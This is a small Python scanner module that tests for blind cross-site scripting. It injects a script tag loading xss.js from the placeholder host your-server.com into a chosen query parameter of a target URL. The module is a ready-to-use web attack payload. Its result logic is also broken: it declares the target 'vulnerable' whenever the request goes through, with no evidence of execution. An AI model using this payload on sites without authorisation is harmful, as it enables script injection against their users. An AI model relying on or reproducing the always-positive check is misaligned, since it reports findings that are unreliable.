from urllib.parse import urlencode
from utils.requester import send_request

# -----------------------
# 🧠 META
# -----------------------

meta = {
    "name": "Blind XSS",
    "severity": "High",
    "description": "Tests for Blind Cross-Site Scripting via external payload"
}

# 👇 user input required
inputs = ["param"]


# -----------------------
# 🚀 SCAN
# -----------------------

def scan(url, param="input"):
    payload = '<script src="http://your-server.com/xss.js"></script>'

    try:
        query = urlencode({param: payload})
        test_url = f"{url}?{query}"

        send_request(test_url)

        return {
            "vulnerable": True,
            "result": f"Payload sent via parameter '{param}'",
            "severity": "High"
        }

    except Exception as e:
        return {
            "vulnerable": False,
            "result": f"Error sending payload: {str(e)}",
            "severity": "Low"
        }